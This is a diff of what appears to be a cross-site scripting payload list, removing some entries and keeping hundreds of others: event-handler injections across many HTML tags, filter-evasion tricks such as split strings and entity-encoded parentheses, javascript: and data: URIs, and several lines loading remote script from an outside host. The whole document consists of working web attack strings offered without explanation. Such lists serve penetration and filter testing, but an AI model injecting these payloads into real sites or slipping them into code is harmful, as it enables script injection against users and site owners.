@@ -5,14 +5,12 @@
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
 "onclick=prompt(8)>"@x.y
-"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 <image/src/onerror=prompt(8)>
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
 <img src/onerror=prompt(8)>
 <image src =q onerror=prompt(8)>
 <img src =q onerror=prompt(8)>
-</scrip</script>t><img src =q onerror=prompt(8)>
 <svg onload=alert(1)>
 "><svg onload=alert(1)//
 "onmouseover=alert(1)//
@@ -21,21 +19,15 @@
 '-alert(1)//
 \'-alert(1)//
 </script><svg onload=alert(1)>
-<x contenteditable onblur=alert(1)>lose focus! 
 <x onclick=alert(1)>click this! 
 <x oncopy=alert(1)>copy this! 
-<x oncontextmenu=alert(1)>right click this! 
 <x oncut=alert(1)>copy this! 
-<x ondblclick=alert(1)>double click this! 
 <x ondrag=alert(1)>drag this! 
-<x contenteditable onfocus=alert(1)>focus this! 
-<x contenteditable oninput=alert(1)>input here! 
 <x onmousedown=alert(1)>click this! 
 <x onmousemove=alert(1)>hover this! 
 <x onmouseout=alert(1)>hover this! 
 <x onmouseover=alert(1)>hover this! 
 <x onmouseup=alert(1)>click this! 
-<x contenteditable onpaste=alert(1)>paste here!
 <script>alert(1)// 
 <script>alert(1)<!–
 <script src=//brutelogic.com.br/1.js> 
@@ -73,9 +65,7 @@
 <iframe src=javascript:alert(1)> 
 <embed src=javascript:alert(1)> 
 <a href=javascript:alert(1)>click 
-<math><brute href=javascript:alert(1)>click 
 <object data=javascript:alert(1)> 
-<svg><script xlink:href=data:,alert(1) /> 
 <html ontouchstart=alert(1)> 
 <html ontouchend=alert(1)> 
 <html ontouchmove=alert(1)> 
@@ -84,26 +74,18 @@
 "><img src=1 onerror=alert(1)>.gif
 <script src="data:&comma;alert(1)//
 "><script src=data:&comma;alert(1)//
-<script src="//brutelogic.com.br&sol;1.js&num; 
-"><script src=//brutelogic.com.br&sol;1.js&num; 
 <base href=//0>
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
 <body onfocus=alert(1)>
-<body onscroll=alert(1)><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br>
 <br><br><br><br><br><br><x id=x>#x
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1! (MSIE)
 <marquee onstart=alert(1)>
-<marquee loop=1 width=0 onfinish=alert(1)>
 <audio src onloadstart=alert(1)>
 <video onloadstart=alert(1)><source>
 <input autofocus onblur=alert(1)>
 <keygen autofocus onfocus=alert(1)>
-<form onsubmit=alert(1)><input type=submit>
-<select onchange=alert(1)><option>1<option>2
 alert`1`
 alert&lpar;1&rpar;
 alert&#x28;1&#x29
@@ -120,20 +102,9 @@ top[8680439..toString(30)](1)
 navigator.vibrate(500)
 eval(URL.slice(-8))>#alert(1)
 eval(location.hash.slice(1)>#alert(1)
-<a draggable="true" ondrag="alert(1)">test</a>
-<a draggable="true" ondragend="alert(1)">test</a>
-<a id=x tabindex=1 onactivate=alert(1)></a>
-<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
-<a id=x tabindex=1 onfocus=alert(1)></a>
-<a id=x tabindex=1 onfocusin=alert(1)></a>
 <a onclick="alert(1)">test</a>
 <a oncontextmenu="alert(1)">test</a>
-<a oncopy="alert(1)" contenteditable>test</a>
-<a oncut="alert(1)" contenteditable>test</a>
 <a ondblclick="alert(1)">test</a>
-<a onkeydown="alert(1)" contenteditable>test</a>
-<a onkeypress="alert(1)" contenteditable>test</a>
-<a onkeyup="alert(1)" contenteditable>test</a>
 <a onmousedown="alert(1)">test</a>
 <a onmouseenter="alert(1)">test</a>
 <a onmouseleave="alert(1)">test</a>
@@ -141,108 +112,20 @@ eval(location.hash.slice(1)>#alert(1)
 <a onmouseout="alert(1)">test</a>
 <a onmouseover="alert(1)">test</a>
 <a onmouseup="alert(1)">test</a>
-<a onpaste="alert(1)" contenteditable>test</a>
-<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
-<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
-<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
 <abbr onclick="alert(1)">test</abbr>
-<abbr oncontextmenu="alert(1)">test</abbr>
 <abbr ondblclick="alert(1)">test</abbr>
-<abbr onmousedown="alert(1)">test</abbr>
-<abbr onmouseenter="alert(1)">test</abbr>
-<abbr onmouseleave="alert(1)">test</abbr>
-<abbr onmousemove="alert(1)">test</abbr>
 <abbr onmouseout="alert(1)">test</abbr>
-<abbr onmouseover="alert(1)">test</abbr>
 <abbr onmouseup="alert(1)">test</abbr>
-<acronym onclick="alert(1)">test</acronym>
-<acronym oncontextmenu="alert(1)">test</acronym>
-<acronym ondblclick="alert(1)">test</acronym>
-<acronym onmousedown="alert(1)">test</acronym>
-<acronym onmouseenter="alert(1)">test</acronym>
-<acronym onmouseleave="alert(1)">test</acronym>
-<acronym onmousemove="alert(1)">test</acronym>
-<acronym onmouseout="alert(1)">test</acronym>
-<acronym onmouseover="alert(1)">test</acronym>
-<acronym onmouseup="alert(1)">test</acronym>
-<address onclick="alert(1)">test</address>
-<address oncontextmenu="alert(1)">test</address>
-<address ondblclick="alert(1)">test</address>
-<address onmousedown="alert(1)">test</address>
-<address onmouseenter="alert(1)">test</address>
-<address onmouseleave="alert(1)">test</address>
-<address onmousemove="alert(1)">test</address>
-<address onmouseout="alert(1)">test</address>
-<address onmouseover="alert(1)">test</address>
-<address onmouseup="alert(1)">test</address>
-<applet onclick="alert(1)">test</applet>
-<applet oncontextmenu="alert(1)">test</applet>
-<applet ondblclick="alert(1)">test</applet>
-<applet onmousedown="alert(1)">test</applet>
-<applet onmouseenter="alert(1)">test</applet>
-<applet onmouseleave="alert(1)">test</applet>
-<applet onmousemove="alert(1)">test</applet>
-<applet onmouseout="alert(1)">test</applet>
-<applet onmouseover="alert(1)">test</applet>
-<applet onmouseup="alert(1)">test</applet>
-<applet onreadystatechange=alert(1)></applet>
-<area id=x tabindex=1 onactivate=alert(1)></area>
 <area onclick="alert(1)">test</area>
-<area oncontextmenu="alert(1)">test</area>
 <area ondblclick="alert(1)">test</area>
-<area onmousedown="alert(1)">test</area>
-<area onmouseenter="alert(1)">test</area>
-<area onmouseleave="alert(1)">test</area>
-<area onmousemove="alert(1)">test</area>
 <area onmouseout="alert(1)">test</area>
-<area onmouseover="alert(1)">test</area>
 <area onmouseup="alert(1)">test</area>
-<article onclick="alert(1)">test</article>
-<article oncontextmenu="alert(1)">test</article>
-<article ondblclick="alert(1)">test</article>
-<article onmousedown="alert(1)">test</article>
-<article onmouseenter="alert(1)">test</article>
-<article onmouseleave="alert(1)">test</article>
-<article onmousemove="alert(1)">test</article>
-<article onmouseout="alert(1)">test</article>
-<article onmouseover="alert(1)">test</article>
-<article onmouseup="alert(1)">test</article>
-<aside id=x tabindex=1 onfocus=alert(1)></aside>
 <aside onclick="alert(1)">test</aside>
-<aside oncontextmenu="alert(1)">test</aside>
-<aside ondblclick="alert(1)">test</aside>
-<aside onmousedown="alert(1)">test</aside>
-<aside onmouseenter="alert(1)">test</aside>
-<aside onmouseleave="alert(1)">test</aside>
-<aside onmousemove="alert(1)">test</aside>
-<aside onmouseout="alert(1)">test</aside>
-<aside onmouseover="alert(1)">test</aside>
-<aside onmouseup="alert(1)">test</aside>
 <audio onclick="alert(1)">test</audio>
-<audio oncontextmenu="alert(1)">test</audio>
-<audio ondblclick="alert(1)">test</audio>
-<audio onmousedown="alert(1)">test</audio>
-<audio onmouseenter="alert(1)">test</audio>
-<audio onmouseleave="alert(1)">test</audio>
-<audio onmousemove="alert(1)">test</audio>
-<audio onmouseout="alert(1)">test</audio>
-<audio onmouseover="alert(1)">test</audio>
-<audio onmouseup="alert(1)">test</audio>
 <audio src/onerror=alert(1)>
-<b draggable="true" ondrag="alert(1)">test</b>
-<b draggable="true" ondragend="alert(1)">test</b>
-<b id=x tabindex=1 onactivate=alert(1)></b>
-<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
-<b id=x tabindex=1 onfocus=alert(1)></b>
-<b id=x tabindex=1 onfocusin=alert(1)></b>
 <b onclick="alert(1)">test</b>
 <b oncontextmenu="alert(1)">test</b>
-<b oncopy="alert(1)" contenteditable>test</b>
-<b oncut="alert(1)" contenteditable>test</b>
 <b ondblclick="alert(1)">test</b>
-<b onkeydown="alert(1)" contenteditable>test</b>
-<b onkeypress="alert(1)" contenteditable>test</b>
-<b onkeyup="alert(1)" contenteditable>test</b>
 <b onmousedown="alert(1)">test</b>
 <b onmouseenter="alert(1)">test</b>
 <b onmouseleave="alert(1)">test</b>
@@ -250,36 +133,11 @@ eval(location.hash.slice(1)>#alert(1)
 <b onmouseout="alert(1)">test</b>
 <b onmouseover="alert(1)">test</b>
 <b onmouseup="alert(1)">test</b>
-<b onpaste="alert(1)" contenteditable>test</b>
-<base id=x tabindex=1 onactivate=alert(1)></base>
-<base id=x tabindex=1 onfocus=alert(1)></base>
-<base id=x tabindex=1 onfocusin=alert(1)></base>
 <base onclick="alert(1)">test</base>
-<base oncontextmenu="alert(1)">test</base>
 <base ondblclick="alert(1)">test</base>
-<base onmousedown="alert(1)">test</base>
-<base onmouseenter="alert(1)">test</base>
-<base onmouseleave="alert(1)">test</base>
-<base onmousemove="alert(1)">test</base>
 <base onmouseout="alert(1)">test</base>
-<base onmouseover="alert(1)">test</base>
 <base onmouseup="alert(1)">test</base>
-<basefont onclick="alert(1)">test</basefont>
-<basefont ondblclick="alert(1)">test</basefont>
-<basefont onmousedown="alert(1)">test</basefont>
-<basefont onmouseenter="alert(1)">test</basefont>
-<basefont onmouseleave="alert(1)">test</basefont>
-<basefont onmousemove="alert(1)">test</basefont>
-<basefont onmouseout="alert(1)">test</basefont>
-<basefont onmouseover="alert(1)">test</basefont>
-<basefont onmouseup="alert(1)">test</basefont>
-<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
-<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
-<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
 <bdi onclick="alert(1)">test</bdi>
-<bdi oncontextmenu="alert(1)">test</bdi>
-<bdi oncopy="alert(1)" contenteditable>test</bdi>
-<bdi oncut="alert(1)" contenteditable>test</bdi>
 <bdi ondblclick="alert(1)">test</bdi>
 <bdi onmousedown="alert(1)">test</bdi>
 <bdi onmouseenter="alert(1)">test</bdi>
@@ -288,13 +146,7 @@ eval(location.hash.slice(1)>#alert(1)
 <bdi onmouseout="alert(1)">test</bdi>
 <bdi onmouseover="alert(1)">test</bdi>
 <bdi onmouseup="alert(1)">test</bdi>
-<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
-<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
-<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
 <bdo onclick="alert(1)">test</bdo>
-<bdo oncontextmenu="alert(1)">test</bdo>
-<bdo oncopy="alert(1)" contenteditable>test</bdo>
-<bdo oncut="alert(1)" contenteditable>test</bdo>
 <bdo ondblclick="alert(1)">test</bdo>
 <bdo onmousedown="alert(1)">test</bdo>
 <bdo onmouseenter="alert(1)">test</bdo>
@@ -303,23 +155,7 @@ eval(location.hash.slice(1)>#alert(1)
 <bdo onmouseout="alert(1)">test</bdo>
 <bdo onmouseover="alert(1)">test</bdo>
 <bdo onmouseup="alert(1)">test</bdo>
-<bgsound onclick="alert(1)">test</bgsound>
-<bgsound oncontextmenu="alert(1)">test</bgsound>
-<bgsound ondblclick="alert(1)">test</bgsound>
-<bgsound onmousedown="alert(1)">test</bgsound>
-<bgsound onmouseenter="alert(1)">test</bgsound>
-<bgsound onmouseleave="alert(1)">test</bgsound>
-<bgsound onmousemove="alert(1)">test</bgsound>
-<bgsound onmouseout="alert(1)">test</bgsound>
-<bgsound onmouseover="alert(1)">test</bgsound>
-<bgsound onmouseup="alert(1)">test</bgsound>
-<big id=x tabindex=1 onactivate=alert(1)></big>
-<big id=x tabindex=1 onfocus=alert(1)></big>
-<big id=x tabindex=1 onfocusin=alert(1)></big>
 <big onclick="alert(1)">test</big>
-<big oncontextmenu="alert(1)">test</big>
-<big oncopy="alert(1)" contenteditable>test</big>
-<big oncut="alert(1)" contenteditable>test</big>
 <big ondblclick="alert(1)">test</big>
 <big onmousedown="alert(1)">test</big>
 <big onmouseenter="alert(1)">test</big>
@@ -328,53 +164,24 @@ eval(location.hash.slice(1)>#alert(1)
 <big onmouseout="alert(1)">test</big>
 <big onmouseover="alert(1)">test</big>
 <big onmouseup="alert(1)">test</big>
-<blink id=x tabindex=1 onfocus=alert(1)></blink>
 <blink onclick="alert(1)">test</blink>
-<blink oncontextmenu="alert(1)">test</blink>
-<blink ondblclick="alert(1)">test</blink>
-<blink onmousedown="alert(1)">test</blink>
-<blink onmouseenter="alert(1)">test</blink>
-<blink onmouseleave="alert(1)">test</blink>
-<blink onmousemove="alert(1)">test</blink>
-<blink onmouseout="alert(1)">test</blink>
-<blink onmouseover="alert(1)">test</blink>
-<blink onmouseup="alert(1)">test</blink>
-<blockquote onclick="alert(1)">test</blockquote>
-<body id=x tabindex=1 onactivate=alert(1)></body>
-<body id=x tabindex=1 onfocus=alert(1)></body>
-<body id=x tabindex=1 onfocusin=alert(1)></body>
 <body onafterprint=alert(1)>
 <body onbeforeprint=alert(1)>
-<body onblur=alert(1) id=x><iframe id=x>
 <body onclick="alert(1)">test</body>
-<body oncontextmenu="alert(1)">test</body>
 <body ondblclick="alert(1)">test</body>
 <body onerror=alert(1) onload=/>
-<body onfocusout=alert(1) id=x><iframe id=x>
 <body onhashchange="alert(1)">
 <body onload=alert(1)>
 <body onmessage=alert(1)>
-<body onmousedown="alert(1)">test</body>
-<body onmouseenter="alert(1)">test</body>
-<body onmouseleave="alert(1)">test</body>
-<body onmousemove="alert(1)">test</body>
 <body onmouseout="alert(1)">test</body>
-<body onmouseover="alert(1)">test</body>
 <body onmouseup="alert(1)">test</body>
 <body onpageshow=alert(1)>
 <body onpopstate=alert(1)>
 <body onresize="alert(1)">
 <body onwheel=alert(1)>
-<br draggable="true" ondrag="alert(1)">test</br>
-<br id=x tabindex=1 onactivate=alert(1)></br>
-<br id=x tabindex=1 onfocus=alert(1)></br>
-<br id=x tabindex=1 onfocusin=alert(1)></br>
 <br onclick="alert(1)">test</br>
 <br oncontextmenu="alert(1)">test</br>
-<br oncopy="alert(1)" contenteditable>test</br>
-<br oncut="alert(1)" contenteditable>test</br>
 <br ondblclick="alert(1)">test</br>
-<br onkeyup="alert(1)" contenteditable>test</br>
 <br onmousedown="alert(1)">test</br>
 <br onmouseenter="alert(1)">test</br>
 <br onmouseleave="alert(1)">test</br>
@@ -382,81 +189,15 @@ eval(location.hash.slice(1)>#alert(1)
 <br onmouseout="alert(1)">test</br>
 <br onmouseover="alert(1)">test</br>
 <br onmouseup="alert(1)">test</br>
-<br onpaste="alert(1)" contenteditable>test</br>
-<button autofocus onfocus=alert(1)>test</button>
-<button onclick="alert(1)">test</button>
-<button oncontextmenu="alert(1)">test</button>
-<button ondblclick="alert(1)">test</button>
-<button onmousedown="alert(1)">test</button>
-<button onmouseenter="alert(1)">test</button>
-<button onmouseleave="alert(1)">test</button>
-<button onmousemove="alert(1)">test</button>
-<button onmouseout="alert(1)">test</button>
-<button onmouseover="alert(1)">test</button>
-<button onmouseup="alert(1)">test</button>
-<canvas onclick="alert(1)">test</canvas>
-<canvas oncontextmenu="alert(1)">test</canvas>
-<canvas ondblclick="alert(1)">test</canvas>
-<canvas onmousedown="alert(1)">test</canvas>
-<canvas onmouseenter="alert(1)">test</canvas>
-<canvas onmouseleave="alert(1)">test</canvas>
-<canvas onmousemove="alert(1)">test</canvas>
-<canvas onmouseout="alert(1)">test</canvas>
-<canvas onmouseover="alert(1)">test</canvas>
-<canvas onmouseup="alert(1)">test</canvas>
-<caption onclick="alert(1)">test</caption>
-<caption oncontextmenu="alert(1)">test</caption>
-<caption ondblclick="alert(1)">test</caption>
-<caption onmousedown="alert(1)">test</caption>
-<caption onmouseenter="alert(1)">test</caption>
-<caption onmouseleave="alert(1)">test</caption>
-<caption onmousemove="alert(1)">test</caption>
-<caption onmouseout="alert(1)">test</caption>
-<caption onmouseover="alert(1)">test</caption>
-<caption onmouseup="alert(1)">test</caption>
-<center onclick="alert(1)">test</center>
-<center oncontextmenu="alert(1)">test</center>
-<center ondblclick="alert(1)">test</center>
-<center onmousedown="alert(1)">test</center>
-<center onmouseenter="alert(1)">test</center>
-<center onmouseleave="alert(1)">test</center>
-<center onmousemove="alert(1)">test</center>
-<center onmouseout="alert(1)">test</center>
-<center onmouseover="alert(1)">test</center>
-<center onmouseup="alert(1)">test</center>
-<cite id=x tabindex=1 onactivate=alert(1)></cite>
-<cite id=x tabindex=1 onfocus=alert(1)></cite>
-<cite id=x tabindex=1 onfocusin=alert(1)></cite>
 <cite onclick="alert(1)">test</cite>
-<cite oncontextmenu="alert(1)">test</cite>
 <cite ondblclick="alert(1)">test</cite>
-<cite onmousedown="alert(1)">test</cite>
-<cite onmouseenter="alert(1)">test</cite>
-<cite onmouseleave="alert(1)">test</cite>
-<cite onmousemove="alert(1)">test</cite>
 <cite onmouseout="alert(1)">test</cite>
-<cite onmouseover="alert(1)">test</cite>
 <cite onmouseup="alert(1)">test</cite>
-<code id=x tabindex=1 onactivate=alert(1)></code>
-<code id=x tabindex=1 onfocus=alert(1)></code>
-<code id=x tabindex=1 onfocusin=alert(1)></code>
 <code onclick="alert(1)">test</code>
-<code oncontextmenu="alert(1)">test</code>
 <code ondblclick="alert(1)">test</code>
-<code onmousedown="alert(1)">test</code>
-<code onmouseenter="alert(1)">test</code>
-<code onmouseleave="alert(1)">test</code>
-<code onmousemove="alert(1)">test</code>
 <code onmouseout="alert(1)">test</code>
-<code onmouseover="alert(1)">test</code>
 <code onmouseup="alert(1)">test</code>
-<col id=x tabindex=1 onactivate=alert(1)></col>
-<col id=x tabindex=1 onfocus=alert(1)></col>
-<col id=x tabindex=1 onfocusin=alert(1)></col>
 <col onclick="alert(1)">test</col>
-<col oncontextmenu="alert(1)">test</col>
-<col oncopy="alert(1)" contenteditable>test</col>
-<col oncut="alert(1)" contenteditable>test</col>
 <col ondblclick="alert(1)">test</col>
 <col onmousedown="alert(1)">test</col>
 <col onmouseenter="alert(1)">test</col>
@@ -465,67 +206,13 @@ eval(location.hash.slice(1)>#alert(1)
 <col onmouseout="alert(1)">test</col>
 <col onmouseover="alert(1)">test</col>
 <col onmouseup="alert(1)">test</col>
-<colgroup onclick="alert(1)">test</colgroup>
-<colgroup ondblclick="alert(1)">test</colgroup>
-<colgroup onmousedown="alert(1)">test</colgroup>
-<colgroup onmouseenter="alert(1)">test</colgroup>
-<colgroup onmouseleave="alert(1)">test</colgroup>
-<colgroup onmousemove="alert(1)">test</colgroup>
-<colgroup onmouseout="alert(1)">test</colgroup>
-<colgroup onmouseover="alert(1)">test</colgroup>
-<colgroup onmouseup="alert(1)">test</colgroup>
-<command onclick="alert(1)">test</command>
-<command oncontextmenu="alert(1)">test</command>
-<command ondblclick="alert(1)">test</command>
-<command onmousedown="alert(1)">test</command>
-<command onmouseenter="alert(1)">test</command>
-<command onmouseleave="alert(1)">test</command>
-<command onmousemove="alert(1)">test</command>
-<command onmouseout="alert(1)">test</command>
-<command onmouseover="alert(1)">test</command>
-<command onmouseup="alert(1)">test</command>
-<content onclick="alert(1)">test</content>
-<content oncontextmenu="alert(1)">test</content>
-<content ondblclick="alert(1)">test</content>
-<content onmousedown="alert(1)">test</content>
-<content onmouseenter="alert(1)">test</content>
-<content onmouseleave="alert(1)">test</content>
-<content onmousemove="alert(1)">test</content>
-<content onmouseout="alert(1)">test</content>
-<content onmouseover="alert(1)">test</content>
-<content onmouseup="alert(1)">test</content>
-<data id=x tabindex=1 onactivate=alert(1)></data>
-<data id=x tabindex=1 onfocus=alert(1)></data>
-<data id=x tabindex=1 onfocusin=alert(1)></data>
 <data onclick="alert(1)">test</data>
-<data oncontextmenu="alert(1)">test</data>
 <data ondblclick="alert(1)">test</data>
-<data onmousedown="alert(1)">test</data>
-<data onmouseenter="alert(1)">test</data>
-<data onmouseleave="alert(1)">test</data>
-<data onmousemove="alert(1)">test</data>
 <data onmouseout="alert(1)">test</data>
-<data onmouseover="alert(1)">test</data>
 <data onmouseup="alert(1)">test</data>
-<datalist onclick="alert(1)">test</datalist>
-<datalist ondblclick="alert(1)">test</datalist>
-<datalist onmousedown="alert(1)">test</datalist>
-<datalist onmouseenter="alert(1)">test</datalist>
-<datalist onmouseleave="alert(1)">test</datalist>
-<datalist onmousemove="alert(1)">test</datalist>
-<datalist onmouseout="alert(1)">test</datalist>
-<datalist onmouseover="alert(1)">test</datalist>
-<datalist onmouseup="alert(1)">test</datalist>
-<dd draggable="true" ondrag="alert(1)">test</dd>
-<dd id=x tabindex=1 onactivate=alert(1)></dd>
-<dd id=x tabindex=1 onfocus=alert(1)></dd>
-<dd id=x tabindex=1 onfocusin=alert(1)></dd>
 <dd onclick="alert(1)">test</dd>
 <dd oncontextmenu="alert(1)">test</dd>
-<dd oncopy="alert(1)" contenteditable>test</dd>
-<dd oncut="alert(1)" contenteditable>test</dd>
 <dd ondblclick="alert(1)">test</dd>
-<dd onkeyup="alert(1)" contenteditable>test</dd>
 <dd onmousedown="alert(1)">test</dd>
 <dd onmouseenter="alert(1)">test</dd>
 <dd onmouseleave="alert(1)">test</dd>
@@ -533,14 +220,7 @@ eval(location.hash.slice(1)>#alert(1)
 <dd onmouseout="alert(1)">test</dd>
 <dd onmouseover="alert(1)">test</dd>
 <dd onmouseup="alert(1)">test</dd>
-<dd onpaste="alert(1)" contenteditable>test</dd>
-<del id=x tabindex=1 onactivate=alert(1)></del>
-<del id=x tabindex=1 onfocus=alert(1)></del>
-<del id=x tabindex=1 onfocusin=alert(1)></del>
 <del onclick="alert(1)">test</del>
-<del oncontextmenu="alert(1)">test</del>
-<del oncopy="alert(1)" contenteditable>test</del>
-<del oncut="alert(1)" contenteditable>test</del>
 <del ondblclick="alert(1)">test</del>
 <del onmousedown="alert(1)">test</del>
 <del onmouseenter="alert(1)">test</del>
@@ -549,24 +229,7 @@ eval(location.hash.slice(1)>#alert(1)
 <del onmouseout="alert(1)">test</del>
 <del onmouseover="alert(1)">test</del>
 <del onmouseup="alert(1)">test</del>
-<details onclick="alert(1)">test</details>
-<details oncontextmenu="alert(1)">test</details>
-<details ondblclick="alert(1)">test</details>
-<details onmousedown="alert(1)">test</details>
-<details onmouseenter="alert(1)">test</details>
-<details onmouseleave="alert(1)">test</details>
-<details onmousemove="alert(1)">test</details>
-<details onmouseout="alert(1)">test</details>
-<details onmouseover="alert(1)">test</details>
-<details onmouseup="alert(1)">test</details>
-<details ontoggle=alert(1) open>test</details>
-<dfn id=x tabindex=1 onactivate=alert(1)></dfn>
-<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
-<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
 <dfn onclick="alert(1)">test</dfn>
-<dfn oncontextmenu="alert(1)">test</dfn>
-<dfn oncopy="alert(1)" contenteditable>test</dfn>
-<dfn oncut="alert(1)" contenteditable>test</dfn>
 <dfn ondblclick="alert(1)">test</dfn>
 <dfn onmousedown="alert(1)">test</dfn>
 <dfn onmouseenter="alert(1)">test</dfn>
@@ -575,23 +238,7 @@ eval(location.hash.slice(1)>#alert(1)
 <dfn onmouseout="alert(1)">test</dfn>
 <dfn onmouseover="alert(1)">test</dfn>
 <dfn onmouseup="alert(1)">test</dfn>
-<dialog onclick="alert(1)">test</dialog>
-<dialog oncontextmenu="alert(1)">test</dialog>
-<dialog ondblclick="alert(1)">test</dialog>
-<dialog onmousedown="alert(1)">test</dialog>
-<dialog onmouseenter="alert(1)">test</dialog>
-<dialog onmouseleave="alert(1)">test</dialog>
-<dialog onmousemove="alert(1)">test</dialog>
-<dialog onmouseout="alert(1)">test</dialog>
-<dialog onmouseover="alert(1)">test</dialog>
-<dialog onmouseup="alert(1)">test</dialog>
-<dir id=x tabindex=1 onactivate=alert(1)></dir>
-<dir id=x tabindex=1 onfocus=alert(1)></dir>
-<dir id=x tabindex=1 onfocusin=alert(1)></dir>
 <dir onclick="alert(1)">test</dir>
-<dir oncontextmenu="alert(1)">test</dir>
-<dir oncopy="alert(1)" contenteditable>test</dir>
-<dir oncut="alert(1)" contenteditable>test</dir>
 <dir ondblclick="alert(1)">test</dir>
 <dir onmousedown="alert(1)">test</dir>
 <dir onmouseenter="alert(1)">test</dir>
@@ -600,13 +247,7 @@ eval(location.hash.slice(1)>#alert(1)
 <dir onmouseout="alert(1)">test</dir>
 <dir onmouseover="alert(1)">test</dir>
 <dir onmouseup="alert(1)">test</dir>
-<div id=x tabindex=1 onactivate=alert(1)></div>
-<div id=x tabindex=1 onfocus=alert(1)></div>
-<div id=x tabindex=1 onfocusin=alert(1)></div>
 <div onclick="alert(1)">test</div>
-<div oncontextmenu="alert(1)">test</div>
-<div oncopy="alert(1)" contenteditable>test</div>
-<div oncut="alert(1)" contenteditable>test</div>
 <div ondblclick="alert(1)">test</div>
 <div onmousedown="alert(1)">test</div>
 <div onmouseenter="alert(1)">test</div>
@@ -615,16 +256,9 @@ eval(location.hash.slice(1)>#alert(1)
 <div onmouseout="alert(1)">test</div>
 <div onmouseover="alert(1)">test</div>
 <div onmouseup="alert(1)">test</div>
-<dl draggable="true" ondrag="alert(1)">test</dl>
-<dl id=x tabindex=1 onactivate=alert(1)></dl>
-<dl id=x tabindex=1 onfocus=alert(1)></dl>
-<dl id=x tabindex=1 onfocusin=alert(1)></dl>
 <dl onclick="alert(1)">test</dl>
 <dl oncontextmenu="alert(1)">test</dl>
-<dl oncopy="alert(1)" contenteditable>test</dl>
-<dl oncut="alert(1)" contenteditable>test</dl>
 <dl ondblclick="alert(1)">test</dl>
-<dl onkeyup="alert(1)" contenteditable>test</dl>
 <dl onmousedown="alert(1)">test</dl>
 <dl onmouseenter="alert(1)">test</dl>
 <dl onmouseleave="alert(1)">test</dl>
@@ -632,17 +266,9 @@ eval(location.hash.slice(1)>#alert(1)
 <dl onmouseout="alert(1)">test</dl>
 <dl onmouseover="alert(1)">test</dl>
 <dl onmouseup="alert(1)">test</dl>
-<dl onpaste="alert(1)" contenteditable>test</dl>
-<dt draggable="true" ondrag="alert(1)">test</dt>
-<dt id=x tabindex=1 onactivate=alert(1)></dt>
-<dt id=x tabindex=1 onfocus=alert(1)></dt>
-<dt id=x tabindex=1 onfocusin=alert(1)></dt>
 <dt onclick="alert(1)">test</dt>
 <dt oncontextmenu="alert(1)">test</dt>
-<dt oncopy="alert(1)" contenteditable>test</dt>
-<dt oncut="alert(1)" contenteditable>test</dt>
 <dt ondblclick="alert(1)">test</dt>
-<dt onkeyup="alert(1)" contenteditable>test</dt>
 <dt onmousedown="alert(1)">test</dt>
 <dt onmouseenter="alert(1)">test</dt>
 <dt onmouseleave="alert(1)">test</dt>
@@ -650,27 +276,9 @@ eval(location.hash.slice(1)>#alert(1)
 <dt onmouseout="alert(1)">test</dt>
 <dt onmouseover="alert(1)">test</dt>
 <dt onmouseup="alert(1)">test</dt>
-<dt onpaste="alert(1)" contenteditable>test</dt>
-<element onclick="alert(1)">test</element>
-<element oncontextmenu="alert(1)">test</element>
-<element ondblclick="alert(1)">test</element>
-<element onmousedown="alert(1)">test</element>
-<element onmouseenter="alert(1)">test</element>
-<element onmouseleave="alert(1)">test</element>
-<element onmousemove="alert(1)">test</element>
-<element onmouseout="alert(1)">test</element>
-<element onmouseover="alert(1)">test</element>
-<element onmouseup="alert(1)">test</element>
-<em draggable="true" ondrag="alert(1)">test</em>
-<em id=x tabindex=1 onactivate=alert(1)></em>
-<em id=x tabindex=1 onfocus=alert(1)></em>
-<em id=x tabindex=1 onfocusin=alert(1)></em>
 <em onclick="alert(1)">test</em>
 <em oncontextmenu="alert(1)">test</em>
-<em oncopy="alert(1)" contenteditable>test</em>
-<em oncut="alert(1)" contenteditable>test</em>
 <em ondblclick="alert(1)">test</em>
-<em onkeyup="alert(1)" contenteditable>test</em>
 <em onmousedown="alert(1)">test</em>
 <em onmouseenter="alert(1)">test</em>
 <em onmouseleave="alert(1)">test</em>
@@ -678,112 +286,23 @@ eval(location.hash.slice(1)>#alert(1)
 <em onmouseout="alert(1)">test</em>
 <em onmouseover="alert(1)">test</em>
 <em onmouseup="alert(1)">test</em>
-<em onpaste="alert(1)" contenteditable>test</em>
-<embed id=x onfocus=alert(1) type=text/html>
-<embed id=x onfocusin=alert(1) type=text/html>
 <embed onclick="alert(1)">test</embed>
-<embed oncontextmenu="alert(1)">test</embed>
-<embed ondblclick="alert(1)">test</embed>
-<embed onmousedown="alert(1)">test</embed>
-<embed onmouseenter="alert(1)">test</embed>
-<embed onmouseleave="alert(1)">test</embed>
-<embed onmousemove="alert(1)">test</embed>
-<embed onmouseout="alert(1)">test</embed>
-<embed onmouseover="alert(1)">test</embed>
-<embed onmouseup="alert(1)">test</embed>
 <embed src=/ onload=alert(1)>
-<embed src=1 onerror=alert(1) type=image/gif>
-<fieldset onclick="alert(1)">test</fieldset>
-<fieldset ondblclick="alert(1)">test</fieldset>
-<fieldset onmousedown="alert(1)">test</fieldset>
-<fieldset onmouseenter="alert(1)">test</fieldset>
-<fieldset onmouseleave="alert(1)">test</fieldset>
-<fieldset onmousemove="alert(1)">test</fieldset>
-<fieldset onmouseout="alert(1)">test</fieldset>
-<fieldset onmouseover="alert(1)">test</fieldset>
-<fieldset onmouseup="alert(1)">test</fieldset>
-<figcaption onclick="alert(1)">test</figcaption>
-<figure onclick="alert(1)">test</figure>
-<figure oncontextmenu="alert(1)">test</figure>
